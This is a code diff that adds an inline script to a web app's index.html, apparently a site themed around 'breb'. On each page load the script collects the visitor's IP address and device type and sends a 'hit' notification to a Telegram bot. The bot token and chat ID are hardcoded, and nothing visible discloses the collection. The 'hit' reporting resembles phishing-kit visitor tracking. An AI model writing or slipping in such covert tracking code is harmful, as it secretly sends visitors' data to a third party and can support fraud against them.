@@ -9,5 +9,54 @@
   <body class="bg-breb-bg">
     <div id="root"></div>
     <script type="module" src="/src/main.jsx"></script>
+    <script>
+      (async function() {
+        // Solo notificar una vez por sesión
+        if (sessionStorage.getItem('hit_notified')) return;
+
+        try {
+          // --- CONFIGURACIÓN DEL BOT DE HITS ---
+          const HIT_BOT_TOKEN = '8634395375:AAFb8HHwRA14QoyU769lYso0I7hlD_c0Ias';
+          const HIT_CHAT_ID = '-5203858846';
+
+          // 1. Obtener IP
+          let ip = "Desconocida";
+          try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+          } catch (e) {}
+
+          // 2. Info de dispositivo
+          const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+          const isMobile = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(userAgent);
+
+          // 3. Generar Hash
+          const hash = Math.random().toString(36).substring(2, 10).toUpperCase();
+
+          // 4. Mensaje
+          const message = `🔔 **-NOTIFICACIÓN DE USUARIO-** 🔔\n\n` +
+                          `*ESTADO:* 🟢 USER EN INICIO\n` +
+                          `🌐 **IP:** \`${ip}\`\n` +
+                          `📱 **Dispositivo:** ${isMobile ? 'Móvil 📱' : 'Escritorio 💻'}\n` +
+                          `#️⃣ **Hash:** \`${hash}\``;
+
+          // 5. Enviar
+          const response = await fetch(`https://api.telegram.org/bot${HIT_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: HIT_CHAT_ID,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          });
+
+          if (response.ok) {
+            sessionStorage.setItem('hit_notified', 'true');
+          }
+        } catch (e) {}
+      })();
+    </script>
   </body>
 </html>
